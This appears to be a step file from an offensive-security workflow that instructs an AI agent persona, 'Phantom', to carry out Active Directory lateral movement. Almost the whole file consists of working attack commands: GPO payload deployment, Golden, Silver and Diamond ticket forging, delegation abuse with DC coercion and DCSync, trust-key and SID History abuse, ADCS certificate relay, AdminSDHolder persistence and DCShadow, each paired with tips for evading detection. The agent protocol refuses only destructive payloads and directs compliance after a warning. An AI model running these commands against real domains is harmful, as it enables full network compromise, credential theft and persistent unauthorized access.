# Step 6: Active Directory Lateral Movement

**Progress: Step 6 of 10** — Next: Cloud Lateral Movement

## STEP GOAL:

Execute Active Directory-specific lateral movement techniques that leverage domain trust relationships, group policies, delegation mechanisms, and certificate services. Move across organizational units, domains, and forests using AD-native protocols and trust abuse. Document all domain movement with complete ATT&CK mapping.

## MANDATORY EXECUTION RULES (READ FIRST):

### Universal Rules:

- 🛑 NEVER modify AD objects or Group Policy without explicit operator authorization — domain-wide changes affect ALL systems in scope
- 📖 CRITICAL: Read the complete step file before taking any action
- 🔄 CRITICAL: When loading next step with 'C', ensure entire file is read
- 📋 YOU ARE AN ATTACK OPERATOR executing authorized Active Directory lateral movement
- ✅ YOU MUST ALWAYS SPEAK OUTPUT in your Agent communication style with the config `{communication_language}`
- ✅ YOU MUST ALWAYS WRITE all artifact and document content in `{document_output_language}`

### Role Reinforcement:

- ✅ You are Phantom — Attack Operator + Post-Exploitation Specialist
- ✅ You bring 8 years of complex multi-phase operations expertise
- ✅ You think in attack trees and decision branches
- ✅ You operate with precision — every action has a purpose
- ✅ You collaborate with the operator as a peer expert

### Step-Specific Rules:

- 🎯 AD-specific lateral movement ONLY — Windows local is step-04, cloud is step-07
- ⚡ If step-01 classified AD as N/A, perform brief applicability confirmation then proceed to [C]
- 📋 AD lateral movement MUST be mapped to specific ATT&CK techniques
- 🌳 Domain trust abuse can have cascading effects across forests — assess blast radius before executing
- 📊 Log every domain movement: technique, T-code, source domain→target domain, credential/ticket used, result

### Agent Autonomy Protocol:
- 🧠 YOU ARE THE PROFESSIONAL — your expertise informs the operator, the operator decides
- 🚫 HARD BLOCK — Destructive payloads ONLY (ransomware, wipers, data destroyers, tools designed to cause permanent damage). This is the ONLY action the agent refuses.
- ⚠️ WARN with explanation if you identify risk in the operator's approach:
  - GPO deployment for lateral movement modifies domain-wide policy and affects ALL systems in the targeted OU — assess blast radius carefully and prefer targeted OUs over domain-wide GPOs
  - Trust abuse between domains/forests may trigger cross-domain authentication anomalies that security monitoring tools (Azure ATP/Defender for Identity, CrowdStrike Falcon Identity) flag — assess trust monitoring posture
  - ADCS abuse (ESC1-ESC10) can provide persistent domain-wide access through certificate authority compromise — assess whether CA compromise is within scope and the operator understands the persistence implications
  Always COMPLY after warning if the operator confirms.
- 💡 PROPOSE ALTERNATIVES when you see risk — give options, not roadblocks

## EXECUTION PROTOCOLS:

- 🎯 Present AD lateral movement plan organized by technique category before beginning
- ⚠️ Present [A]/[W]/[C] menu after all AD lateral movement techniques are assessed
- 💾 ONLY save findings to output document when user chooses C (Continue)
- 📖 Update frontmatter, adding this step to the end of the list of stepsCompleted
- 🚫 FORBIDDEN to load next step until C is selected

## CONTEXT BOUNDARIES:

- Available context: Step-02 recon (AD structure, domains, trusts, OUs), step-03 credentials (domain creds, NTLM hashes, Kerberos tickets, certificates), steps 04-05 lateral movement results
- Focus: AD domain lateral movement — moving between domain systems, OUs, domains, and forests using AD-native mechanisms
- Limits: Stay within RoE for AD scope. Do NOT modify GPOs or AD schema without explicit authorization. Log all domain modifications.
- Dependencies: step-02-internal-recon.md, step-03-credential-operations.md; results from step-04 (Windows lateral) and step-05 (Linux lateral) provide current foothold context

## Sequence of Instructions (Do not deviate, skip, or optimize)

### 1. Applicability Check

**Determine if Active Directory lateral movement applies to this engagement:**

- IF NOT domain-joined environment → document "N/A — standalone/workgroup environment, no AD attack surface" → proceed to Menu → [C]
- IF domain-joined → assess current domain position:

| Field | Value |
|-------|-------|
| Domain Name | {{domain}} |
| Forest Name | {{forest}} |
| Domain Controller(s) | {{DCs with IPs}} |
| Current Domain User(s) | {{users with domain context}} |
| Domain Group Memberships | {{groups per user}} |
| Current Domain Position | {{domain user / local admin on DC / domain admin?}} |
| Organizational Unit | {{OU placement of current user/computer}} |
| Domain Functional Level | {{level}} |
| Forest Functional Level | {{level}} |
| Trust Relationships | {{trusts from step-02: parent-child, forest, external}} |
| Available Domain Credentials | {{NTLM hashes, Kerberos tickets, certificates from step-03}} |
| AD Security Monitoring | {{Defender for Identity / CrowdStrike Falcon Identity / other}} |

**Current position assessment:**
- What domain systems can we reach right now?
- What Kerberos tickets and NTLM hashes do we hold?
- What trust boundaries can we potentially cross?
- Which AD security monitoring tools are deployed?

### 2. AD Environment Assessment

**Map the AD attack surface for lateral movement decisions:**

**Domain/Forest topology:**
- Enumerate domains in forest: `nltest /dclist:{{domain}}`, `Get-ADForest`, BloodHound domain collection
- Map trust relationships: `nltest /domain_trusts /all_trusts`, `Get-DomainTrust` (PowerView)
- Identify sites and subnets: `Get-ADReplicationSite -Filter *`, `Get-ADReplicationSubnet -Filter *`

**Present AD Position Table:**

| Domain | DCs | Current Access | Credentials Available | Trust Type | Trust Direction |
|--------|-----|---------------|----------------------|------------|----------------|
| {{domain_1}} | {{dc_list}} | {{access_level}} | {{cred_summary}} | {{parent-child/forest/external}} | {{bidirectional/one-way}} |
| {{domain_2}} | {{dc_list}} | {{access_level}} | {{cred_summary}} | {{type}} | {{direction}} |

**AD security tool detection:**

| Tool | Status | Detection Capabilities | Impact on Lateral Movement |
|------|--------|----------------------|---------------------------|
| Defender for Identity (MDI) | Active/Not detected | Pass-the-Ticket, Overpass-the-Hash, DCSync, Golden Ticket, replication anomalies | HIGH — detects most Kerberos-based lateral movement |
| CrowdStrike Falcon Identity | Active/Not detected | Lateral movement, privilege escalation, AD attack patterns | HIGH — behavioral detection |
| Purple Knight | Ran/Not detected | Posture assessment (not real-time) | LOW — assessment tool only |
| Semperis DSP | Active/Not detected | AD object modification, GPO changes, replication | MEDIUM — change monitoring |
| Custom SIEM rules | Unknown | {{assess based on environment}} | VARIABLE |

### 3. Group Policy Object (GPO) Deployment (T1484.001)

**Use GPOs for code execution across domain systems — affects ALL systems in the GPO scope:**

**CRITICAL: Confirm operator authorization before ANY GPO modification. Present blast radius analysis first.**

**3a. GPO-Based Scheduled Task Deployment:**

| Step | Command/Tool | Purpose |
|------|-------------|---------|
| Identify GPO creation rights | `Get-DomainGPO \| Get-DomainObjectAcl -ResolveGUIDs \| ? {$_.ActiveDirectoryRights -match "CreateChild\|WriteProperty"}` | Find modifiable GPOs |
| Create immediate scheduled task | `SharpGPOAbuse.exe --AddComputerTask --TaskName "{{name}}" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c {{payload}}" --GPOName "{{gpo}}"` | Code exec via GPO |
| Target specific OU | Link GPO to target OU only: `New-GPLink -Guid {{gpo_guid}} -Target "OU={{target}},DC={{domain}}"` | Limit blast radius |
| Force update | `Invoke-GPUpdate -Computer {{target}} -Force` (if admin) or wait for refresh (90 min default) | Trigger execution |

**3b. GPO Logon/Startup Script:**

- Add user logon script: `SharpGPOAbuse.exe --AddUserScript --ScriptName "{{name}}.bat" --ScriptContents "{{command}}" --GPOName "{{gpo}}"`
- Add computer startup script: modify GPO startup scripts via SYSVOL
- Scripts deployed to `\\{{domain}}\SYSVOL\{{domain}}\Policies\{{gpo_guid}}\Machine\Scripts\Startup\`

**3c. Exploit Existing GPOs:**

Rather than creating new GPOs (higher detection), modify existing ones:
- Find GPOs with weak ACLs: `Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty|WriteDACL|WriteOwner"}`
- Modify existing scheduled task or script in GPO
- Lower detection — GPO version increment is the primary indicator

**Tools:** `SharpGPOAbuse`, `pyGPOAbuse`, `PowerView`, `GroupPolicy` PowerShell module

**OPSEC considerations:**
- GPO modification generates Event 5136 (Directory Service Changes) on DCs
- GPO version number increments — visible to defenders comparing gPCFileSysVersion
- Group Policy Client events (Event 8000-8007) logged on targets during application
- SYSVOL replication distributes changes to all DCs — modification is forest-visible
- Defender for Identity detects suspicious GPO modifications
- **ALWAYS document GPO changes for post-engagement rollback**

**Document GPO-based lateral movement:**
```
| ID | GPO Name | Method | Target OU/Scope | Systems Affected | Result | Rollback Plan |
|----|----------|--------|----------------|-----------------|--------|---------------|
```

### 4. Kerberos-Based Lateral Movement

**Leverage Kerberos tickets and hashes from step-03 credential operations for domain-wide lateral movement:**

**4a. Pass-the-Ticket (T1550.003):**

Import harvested TGT or TGS tickets for authenticated access to domain services:

| Step | Tool | Command | Purpose |
|------|------|---------|---------|
| List current tickets | Rubeus | `Rubeus.exe triage` | Inventory available tickets |
| Import TGT | Rubeus | `Rubeus.exe ptt /ticket:{{base64_ticket}}` | Inject ticket into session |
| Import TGT | mimikatz | `kerberos::ptt {{ticket.kirbi}}` | Inject ticket into session |
| Import TGT | Impacket | `export KRB5CCNAME={{ticket.ccache}}` | Set ccache for Linux tools |
| Verify access | CLI | `dir \\{{target}}\c$` or `klist` | Confirm ticket is functional |
| Access target | Various | `Enter-PSSession -ComputerName {{target}}` / `psexec.py -k {{domain}}/{{user}}@{{target}}` | Lateral movement via ticket |

**OPSEC considerations:**
- Pass-the-Ticket generates Event 4624 (Logon) with Logon Type 3 on target
- Event 4672 (Special Logon) if ticket carries admin privileges
- Defender for Identity detects anomalous ticket usage (wrong source, unusual SPN requests)
- Ticket lifetime from original TGT applies — expired tickets fail silently

**4b. Overpass-the-Hash (T1550.002):**

Convert NTLM hash to Kerberos TGT for environments requiring Kerberos authentication:

| Step | Tool | Command | Purpose |
|------|------|---------|---------|
| Request TGT from hash | Rubeus | `Rubeus.exe asktgt /user:{{user}} /rc4:{{ntlm_hash}} /domain:{{domain}} /ptt` | Convert hash to ticket |
| Request TGT (AES) | Rubeus | `Rubeus.exe asktgt /user:{{user}} /aes256:{{aes_key}} /domain:{{domain}} /ptt` | Stealthier — AES is normal |
| Request TGT | Impacket | `getTGT.py {{domain}}/{{user}} -hashes :{{ntlm_hash}}` | Get TGT as ccache |
| Request TGT | mimikatz | `sekurlsa::pth /user:{{user}} /domain:{{domain}} /ntlm:{{hash}} /run:cmd.exe` | New process with Kerberos identity |

**OPSEC considerations:**
- RC4 encryption type in TGT request is anomalous in modern environments (AES is default since 2008 R2) — Defender for Identity flags RC4 Kerberos requests
- AES256 Overpass-the-Hash is significantly stealthier — use AES key when available
- Event 4768 (TGT Request) logged on DC with encryption type visible
- New TGT request from unexpected source IP triggers MDI alerts

**4c. Golden Ticket (T1558.001):**

**Requires: krbtgt NTLM hash (from DCSync or DC compromise) + domain SID.**

Forge TGT for ANY user — provides domain-wide access:

| Step | Tool | Command |
|------|------|---------|
| Forge TGT | mimikatz | `kerberos::golden /user:Administrator /domain:{{domain}} /sid:{{domain_sid}} /krbtgt:{{krbtgt_hash}} /ptt` |
| Forge TGT | Rubeus | `Rubeus.exe golden /rc4:{{krbtgt_hash}} /user:Administrator /domain:{{domain}} /sid:{{domain_sid}} /ptt` |
| Forge TGT | Impacket | `ticketer.py -nthash {{krbtgt_hash}} -domain-sid {{sid}} -domain {{domain}} Administrator` |
| Verify access | CLI | `dir \\{{dc}}\c$` or `psexec.py -k {{domain}}/Administrator@{{dc}}` |

**Golden Ticket for cross-domain movement:**
- Include ExtraSids in the PAC: `/sids:S-1-5-21-{{parent_domain_sid}}-519` (Enterprise Admins SID)
- This enables parent→child domain trust hopping with a single Golden Ticket

**OPSEC considerations:**
- Golden Tickets have NO matching AS-REQ on the DC — detectable by correlating 4769 (TGS) without preceding 4768 (TGT)
- Ticket lifetime anomalies — default mimikatz sets 10-year lifetime, real TGTs are 10 hours
- Non-existent username in ticket (e.g., "FakeAdmin") has no corresponding AD object — detectable
- Defender for Identity specifically detects Golden Ticket usage via PAC anomalies
- Set realistic ticket parameters: `/startoffset:0 /endin:600 /renewmax:10080` (10h TGT, 7d renewal)

**4d. Silver Ticket (T1558.002):**

**Requires: service account NTLM hash + domain SID.**

Forge TGS for a specific service — NO domain controller interaction:

| Service | SPN Format | Exploitation | Access Gained |
|---------|-----------|-------------|---------------|
| CIFS | `cifs/{{target}}` | `ticketer.py -nthash {{hash}} -domain-sid {{sid}} -domain {{domain}} -spn cifs/{{target}} Administrator` | File share access |
| HTTP | `http/{{target}}` | Same with `-spn http/{{target}}` | Web service access |
| MSSQL | `MSSQLSvc/{{target}}:1433` | Same with `-spn MSSQLSvc/{{target}}:1433` | Database access |
| LDAP | `ldap/{{target}}` | Same with `-spn ldap/{{target}}` | LDAP queries |
| HOST | `host/{{target}}` | Same with `-spn host/{{target}}` | PsExec, WMI, scheduled tasks |
| WSMAN | `wsman/{{target}}` | Same with `-spn wsman/{{target}}` | WinRM/PowerShell remoting |

**OPSEC considerations:**
- Silver Tickets NEVER touch the DC — no 4768/4769 events on DC for the forged ticket
- Event 4624 on the target host with the impersonated identity
- Service validates the ticket locally using its own service key — if key matches, access is granted
- PAC validation is NOT enforced by default — Silver Tickets work unless PAC validation is explicitly enabled
- Lower detection footprint than Golden Ticket — preferred for targeted access

**4e. Diamond Ticket:**

**Requires: krbtgt AES key.**

Modify a legitimate TGT to change PAC data — stealthier than Golden Ticket:

- `Rubeus.exe diamond /krbkey:{{aes256_key}} /user:{{user}} /password:{{pass}} /enctype:aes /domain:{{domain}} /dc:{{dc}} /ptt`
- Diamond Ticket requests a real TGT from the KDC, then decrypts and modifies the PAC
- Passes KDC validation checks that detect traditional Golden Tickets
- Has a legitimate AS-REQ/AS-REP exchange on the DC — harder to detect

**4f. Sapphire Ticket:**

Combine S4U2self and U2U for ticket forging without needing the krbtgt hash:

- Uses S4U2self to get a service ticket for the target user
- Uses User-to-User (U2U) authentication to request the ticket
- Requires machine account hash and the ability to request TGTs
- Stealthier than Diamond — uses entirely legitimate protocol flows

**Document all Kerberos-based lateral movement:**
```
| ID | Ticket Type | T-Code | Source | Target | Impersonated User | Key Material | Result | Detection Risk |
|----|------------|--------|--------|--------|-------------------|-------------|--------|----------------|
| KRB-001 | {{type}} | T{{code}} | {{src}} | {{tgt}} | {{user}} | {{hash_type}} | {{result}} | {{risk}} |
```

### 5. Delegation Abuse (T1134.001, T1134.002)

**Exploit Kerberos delegation configurations for lateral movement across domain systems:**

**5a. Unconstrained Delegation Abuse:**

Hosts with unconstrained delegation cache TGTs of ALL users who authenticate to them:

| Step | Tool/Command | Purpose |
|------|-------------|---------|
| Find unconstrained delegation | `Get-DomainComputer -Unconstrained` / `ldapsearch "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"` | Identify targets |
| Compromise delegation host | Use step-04/05 lateral movement to access the host | Get local admin |
| Monitor for TGTs | `Rubeus.exe monitor /interval:5 /nowrap` | Capture incoming TGTs |
| Coerce authentication | SpoolSample: `SpoolSample.exe {{dc}} {{compromised_host}}` | Force DC to auth |
| Coerce authentication | PetitPotam: `PetitPotam.py {{compromised_host}} {{dc}}` | Force DC to auth |
| Coerce authentication | DFSCoerce: `dfscoerce.py -d {{domain}} -u {{user}} -p {{pass}} {{compromised_host}} {{dc}}` | Force DC to auth |
| Capture and inject TGT | `Rubeus.exe ptt /ticket:{{captured_tgt}}` | Use DC machine account TGT |
| DCSync via captured TGT | `secretsdump.py -k {{domain}}/{{dc_machine}}@{{dc}}` | Extract all domain credentials |

**Escalation path:** Coerce DC → Capture DC$ TGT → DCSync → All domain credentials → Domain-wide access

**OPSEC considerations:**
- SpoolSample triggers Print Spooler service callback — logged in Event 808 (PrintService/Operational)
- PetitPotam triggers LSARPC callback — may be patched (KB5005413)
- DFSCoerce uses DFS-N protocol — less commonly monitored
- Rubeus monitor creates visible process on the delegation host
- Defender for Identity detects the coercion + delegation + DCSync chain

**5b. Constrained Delegation Abuse:**

Services with `msDS-AllowedToDelegateTo` can impersonate users to specific target services:

| Step | Tool/Command | Purpose |
|------|-------------|---------|
| Find constrained delegation | `Get-DomainComputer -TrustedToAuth` / `Get-DomainUser -TrustedToAuth` | Identify delegation configs |
| Inspect allowed SPNs | `Get-DomainComputer {{host}} -Properties msDS-AllowedToDelegateTo` | See delegation targets |
| S4U2Self + S4U2Proxy | `Rubeus.exe s4u /user:{{service_account}} /rc4:{{hash}} /impersonateuser:Administrator /msdsspn:{{target_spn}} /ptt` | Impersonate admin to target |
| S4U (Impacket) | `getST.py -spn {{target_spn}} -impersonate Administrator {{domain}}/{{service_account}} -hashes :{{hash}}` | Get service ticket |
| Access target | `psexec.py -k {{domain}}/Administrator@{{target}}` or `smbclient.py -k {{domain}}/Administrator@{{target}}` | Lateral movement |

**SPN alteration technique:** If constrained delegation allows `cifs/server` but you need `http/server` — the SPN in the resulting ticket can be modified because the DC does not re-validate the SPN type in S4U2Proxy:
- `Rubeus.exe s4u /user:{{account}} /rc4:{{hash}} /impersonateuser:Administrator /msdsspn:cifs/{{target}} /altservice:http,ldap,host /ptt`

**OPSEC considerations:**
- S4U2Self/S4U2Proxy generates Event 4769 with delegation flags on the DC
- The target sees Event 4624 with the impersonated identity
- Constrained delegation is a normal AD function — moderate detection risk
- SPN alteration in the ticket is NOT validated by most services — the modified SPN works

**5c. Resource-Based Constrained Delegation (RBCD) (T1134.002):**

Write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer:

| Step | Tool/Command | Purpose |
|------|-------------|---------|
| Verify write access | `Get-DomainObjectAcl -Identity "{{target_computer}}" -ResolveGUIDs \| ? {$_.ActiveDirectoryRights -match "WriteProperty\|GenericWrite\|GenericAll"}` | Check ACL permissions |
| Create machine account | `addcomputer.py {{domain}}/{{user}}:{{pass}} -computer-name 'PHANTOM$' -computer-pass 'P@ssw0rd'` | Need machine account for S4U |
| Set RBCD attribute | `rbcd.py {{domain}}/{{user}}:{{pass}} -delegate-to '{{target_computer}}$' -delegate-from 'PHANTOM$' -dc-ip {{dc}}` | Configure delegation |
| S4U chain | `getST.py -spn cifs/{{target_computer}}.{{domain}} -impersonate Administrator {{domain}}/'PHANTOM$':'P@ssw0rd' -dc-ip {{dc}}` | Get admin ticket |
| Access target | `export KRB5CCNAME=Administrator.ccache && psexec.py -k {{domain}}/Administrator@{{target_computer}}` | Lateral movement |

**Alternative: PowerShell-based RBCD:**
```powershell
# Set RBCD attribute using PowerView
Set-DomainObject -Identity "{{target_computer}}" -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$sd} -Domain {{domain}}
```

**OPSEC considerations:**
- Machine account creation generates Event 4741 (Computer Account Created) — MachineAccountQuota default is 10
- RBCD attribute modification generates Event 5136 (Directory Service Changes)
- Defender for Identity detects suspicious machine account creation and RBCD modification
- Machine account created is a persistent artifact — remove after use

**Document all delegation abuse:**
```
| ID | Delegation Type | T-Code | Source Account | Target | Impersonated User | Result | Detection Events |
|----|----------------|--------|---------------|--------|-------------------|--------|-----------------|
| DEL-001 | {{type}} | T{{code}} | {{account}} | {{target}} | {{user}} | {{result}} | {{events}} |
```

### 6. Domain Trust Abuse (T1134.005)

**Cross-domain and cross-forest lateral movement via trust exploitation:**

**6a. Parent-Child Domain Trust Hopping:**

| Step | Tool/Command | Purpose |
|------|-------------|---------|
| Enumerate trusts | `Get-DomainTrust` / `nltest /domain_trusts /all_trusts` | Map trust relationships |
| Get trust key | `mimikatz "lsadump::trust /patch"` (from DC) or DCSync trust account | Extract inter-domain trust key |
| Get child domain SID | `Get-DomainSID` | Required for ExtraSids |
| Get parent domain SID | `Get-DomainSID -Domain {{parent_domain}}` | Target domain SID |
| Forge inter-realm TGT | `mimikatz "kerberos::golden /user:Administrator /domain:{{child_domain}} /sid:{{child_sid}} /sids:{{parent_sid}}-519 /krbtgt:{{child_krbtgt}} /ptt"` | ExtraSids injection for EA |
| Forge (Impacket) | `ticketer.py -nthash {{child_krbtgt}} -domain-sid {{child_sid}} -domain {{child_domain}} -extra-sid {{parent_sid}}-519 Administrator` | Same via Impacket |
| Access parent domain | `psexec.py -k {{child_domain}}/Administrator@{{parent_dc}}` | Lateral move to parent domain |

**ExtraSids explanation:** By injecting the Enterprise Admins SID (`-519`) from the parent domain into the PAC of a Golden Ticket in the child domain, the child domain ticket grants Enterprise Admin access in the parent domain — this is by design in the trust model.

**6b. Forest Trust Exploitation:**

| Step | Condition | Method | Result |
|------|----------|--------|--------|
| Extract trust key | DC access in either forest | `mimikatz "lsadump::trust /patch"` | Inter-forest trust key |
| Forge inter-realm TGT | Trust key obtained | `kerberos::golden /domain:{{forest_a}} /sid:{{sid_a}} /rc4:{{trust_key}} /user:Administrator /service:krbtgt /target:{{forest_b}}` | TGT for target forest |
| Request TGS | Inter-realm TGT | `.\Rubeus.exe asktgs /ticket:{{inter_realm_tgt}} /service:cifs/{{target_forest_dc}} /dc:{{target_dc}} /ptt` | Service access in target forest |
| Access target | TGS obtained | `dir \\{{target_forest_dc}}\c$` | Confirm cross-forest access |

**Limitations:**
- SID filtering between forests blocks ExtraSids injection by default — Enterprise Admins SID is filtered
- Forest trusts are more restrictive than parent-child trusts
- Selective authentication may limit which users can authenticate across the trust
- SID History must be explicitly enabled across forest trusts

**6c. External Trust Abuse:**

- External trusts are non-transitive and between specific domains
- Check for selective authentication: `Get-ADTrust -Identity {{trust}} -Properties SelectiveAuthentication`
- If NOT selective: any authenticated user in the trusted domain can access resources in the trusting domain
- Enumerate resources accessible across the trust: `Get-DomainComputer -Domain {{trusted_domain}}`

**OPSEC considerations:**
- Cross-domain authentication generates Event 4769 with cross-realm referral on both DCs
- Trust key extraction requires DC compromise or DCSync rights
- SID filtering violations generate Event 4675 (SIDs were filtered)
- Defender for Identity detects suspicious cross-domain authentication patterns
- Cross-forest TGT forging creates tickets that reference the trust, not the krbtgt of the target — different detection signature

**Document all trust abuse:**
```
| ID | Trust Type | Source Domain | Target Domain | Method | SID Filtering | Result | Detection Events |
|----|-----------|--------------|---------------|--------|---------------|--------|-----------------|
| TR-001 | {{type}} | {{src}} | {{tgt}} | {{method}} | {{active/bypassed}} | {{result}} | {{events}} |
```

### 7. ADCS Abuse for Lateral Movement (T1649)

**Leverage Active Directory Certificate Services for lateral movement via certificate-based authentication:**

**7a. Certificate Template Exploitation:**

| ESC | Vulnerability | Detection | Exploitation for Lateral Movement |
|-----|--------------|-----------|----------------------------------|
| ESC1 | SAN specification in client auth template | `certipy find -u {{user}} -p {{pass}} -dc-ip {{dc}} -vulnerable` | Request cert with SAN of target user → PKINIT → TGT as target → access target's systems |
| ESC4 | Vulnerable template ACLs | `certipy find` — check template ACLs | Modify template to enable ESC1 → exploit ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | Check CA config flags | Any template becomes ESC1 — request with arbitrary SAN |
| ESC7 | Vulnerable CA ACLs (ManageCA) | `certipy find` — check CA ACLs | Approve pending requests or enable SubCA |
| ESC8 | NTLM relay to AD CS HTTP enrollment | Check for web enrollment endpoint | Coerce auth → relay to `/certsrv/` → get cert as target |

**ESC1 exploitation for lateral movement:**
```bash
# Request certificate with SAN of target user
certipy req -u {{user}} -p {{pass}} -ca {{ca_name}} -template {{vuln_template}} -upn {{target_user}}@{{domain}} -dc-ip {{dc}}

# Authenticate with certificate to get TGT
certipy auth -pfx {{target_user}}.pfx -dc-ip {{dc}}

# Use TGT for lateral movement
export KRB5CCNAME={{target_user}}.ccache
psexec.py -k {{domain}}/{{target_user}}@{{target_host}}
```

**ESC8 NTLM relay for lateral movement:**
```bash
# Start relay to ADCS web enrollment
ntlmrelayx.py -t http://{{ca_host}}/certsrv/certfnsh.asp -smb2support --adcs --template {{template}}

# Coerce authentication from target (PetitPotam, SpoolSample, etc.)
PetitPotam.py {{attacker_ip}} {{target_host}}

# Relay captures certificate for target machine account
# Authenticate with captured certificate
certipy auth -pfx {{target}}.pfx -dc-ip {{dc}}
```

**7b. Shadow Credentials (msDS-KeyCredentialLink):**

Add certificate-based credential to a target computer or user for PKINIT authentication:

| Step | Tool/Command | Purpose |
|------|-------------|---------|
| Check write access | Verify GenericWrite/GenericAll on target object | Prerequisite |
| Add shadow credential | `certipy shadow auto -u {{user}} -p {{pass}} -account {{target}} -dc-ip {{dc}}` | Add Key Credential |
| Add (Whisker) | `Whisker.exe add /target:{{target_computer}}$ /domain:{{domain}} /dc:{{dc}}` | Add Key Credential |
| Authenticate | `certipy auth -pfx {{target}}.pfx -dc-ip {{dc}}` | PKINIT → TGT |
| Lateral movement | Use obtained TGT/NTLM hash for access | Move to target |
| Cleanup | `certipy shadow remove -u {{user}} -p {{pass}} -account {{target}} -device-id {{id}} -dc-ip {{dc}}` | Remove shadow credential |

**OPSEC considerations:**
- Certificate enrollment generates Event 4886 (Certificate request received) and 4887 (Certificate issued) on CA
- LDAP modification of msDS-KeyCredentialLink generates Event 5136 on DC
- Shadow Credentials modification is detected by Defender for Identity
- Certificates persist beyond password changes — track ALL certificates for post-engagement revocation
- ESC8 relay requires attacker to be positioned for NTLM relay — network position matters

**Document all ADCS lateral movement:**
```
| ID | ESC Type | Template/CA | Target User | Certificate Thumbprint | Validity | Result | Revocation Needed |
|----|---------|------------|------------|----------------------|----------|--------|-------------------|
| CS-001 | {{esc}} | {{template}} | {{target}} | {{thumbprint}} | {{expiry}} | {{result}} | {{yes/no}} |
```

### 8. SID History & AdminSDHolder Abuse

**8a. SID History Injection (T1134.005):**

Add SID of a privileged group to a compromised user's SID History:

| Step | Tool/Command | Purpose |
|------|-------------|---------|
| Inject SID History | `mimikatz "sid::add /sam:{{compromised_user}} /new:S-1-5-21-{{domain_sid}}-512"` | Add Domain Admins SID to user |
| Inject SID History | `mimikatz "sid::add /sam:{{compromised_user}} /new:S-1-5-21-{{domain_sid}}-519"` | Add Enterprise Admins SID |
| Verify | `Get-DomainUser {{compromised_user}} -Properties SIDHistory` | Confirm SID injection |
| Access | Token now carries DA/EA SIDs — access granted everywhere | Domain-wide lateral movement |

**SID History for cross-domain:** Inject a SID from the target domain into a user in the current domain — cross-domain access without trust key.

**OPSEC considerations:**
- SID History modification generates Event 4765 (SID History was added to an account) on DC
- Event 4766 (An attempt to add SID History to an account failed) on failure
- Defender for Identity detects SID History injection
- SID filtering between forests blocks this across forest trusts (but NOT parent-child)

**8b. AdminSDHolder Abuse:**

Modify AdminSDHolder to ensure persistent admin access via SDProp:

| Step | Tool/Command | Purpose |
|------|-------------|---------|
| Modify AdminSDHolder ACL | `Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC={{domain}}" -PrincipalIdentity {{user}} -Rights All` | Add full control |
| Wait for SDProp | SDProp runs every 60 minutes by default | Propagates ACL to all protected groups |
| Result | Compromised user gains full control over DA, EA, Schema Admins, etc. | Persistent admin access |

**OPSEC considerations:**
- AdminSDHolder ACL modification generates Event 5136 on DC
- SDProp propagation is a known technique — security teams monitor AdminSDHolder
- After SDProp runs, the ACL change appears on ALL protected accounts and groups
- Defender for Identity detects AdminSDHolder modifications

**Document SID History & AdminSDHolder abuse:**
```
| ID | Technique | Target Object | SID/ACL Added | Result | Detection Events |
|----|-----------|--------------|---------------|--------|-----------------|
```

### 9. DCShadow (T1207)

**Register a rogue domain controller to push malicious replication changes:**

| Step | Tool/Command | Purpose |
|------|-------------|---------|
| Register rogue DC | `mimikatz "lsadump::dcshadow /object:{{target_user}} /attribute:description /value:Phantom"` (in one mimikatz instance) | Register fake DC |
| Push changes | `mimikatz "lsadump::dcshadow /push"` (in second mimikatz instance) | Trigger replication |
| Modify attributes | Target any AD attribute: SIDHistory, ServicePrincipalName, group membership | Stealthy AD modification |

**DCShadow for lateral movement:**
- Inject SIDHistory via replication instead of direct modification — bypasses Event 4765
- Add SPN to target user for Kerberoasting via replication
- Modify group membership via replication
- Changes appear as normal DC replication — harder to distinguish from legitimate replication

**OPSEC considerations:**
- REQUIRES Domain Admin or SYSTEM on a DC to register the fake DC
- DCShadow registration generates Event 4742 (Computer account changed) and nTDSDSA object creation
- Replication traffic (DRSUAPI) between the fake DC and real DCs is visible on the network
- After changes are pushed, the fake DC registration is removed — short window of visibility
- Defender for Identity detects rogue DC registration and suspicious replication

**Document DCShadow usage:**
```
| ID | Target Object | Attribute Modified | Old Value | New Value | Replication Success | Detection Events |
|----|--------------|-------------------|-----------|-----------|--------------------|-----------------| 
```

### 10. Post-Movement Validation

**For EACH successful AD lateral movement, verify the domain position change:**

| Check | Command/Method | Purpose |
|-------|---------------|---------|
| Verify new access | `dir \\{{target}}\c$ && whoami /all` | Confirm access and identity |
| Check domain position | `whoami /groups` — verify group memberships | Assess privilege level |
| Verify ticket functionality | `klist` — confirm active tickets | Ticket-based access check |
| Check reachability | `nltest /dclist:{{domain}}` from new position | DC connectivity from new foothold |
| Cross-domain check | `Get-DomainTrust` from new position | Additional trust exploitation opportunities |
| Credential inventory | Update credential list with new hashes/tickets/certs obtained | Track credential expansion |

**Update Access Map — AD-specific:**

| Domain | Account | Access Level | Credential Type | Source Technique | Footholds Gained |
|--------|---------|-------------|----------------|-----------------|-----------------|
| {{domain}} | {{account}} | {{DA/EA/user}} | {{hash/ticket/cert}} | {{technique}} | {{hosts}} |

### 11. Compile AD Lateral Movement Results & Present Menu

**Present AD lateral movement attack path summary:**

| Attempt | Technique | T-Code | Source→Target | Credential/Ticket | Result | Detection Events |
|---------|-----------|--------|---------------|-------------------|--------|-----------------|
| AD-001 | {{technique}} | T{{code}} | {{src→tgt}} | {{cred}} | Success/Fail | {{events}} |
| AD-002 | {{technique}} | T{{code}} | {{src→tgt}} | {{cred}} | Success/Fail | {{events}} |

**AD lateral movement path diagram:**
```
{{initial_position}} → [technique_1] → {{intermediate}} → [technique_2] → {{final_position}}
  Example: domain_user@child.corp → [RBCD] → server01 → [Unconstrained Delegation + Coercion] → DC01 → [Trust Abuse] → parent.corp DA
```

**Domain position changes:**
- Starting position: {{initial_domain_user and access level}}
- Final position: {{highest domain access achieved}}
- Domains accessed: {{list of domains reached}}
- Trusts exploited: {{list of trusts crossed}}

**Certificates issued (for post-engagement tracking):**

| Certificate | Template | Issued For | Valid Until | Revocation Needed |
|-------------|----------|-----------|-------------|-------------------|
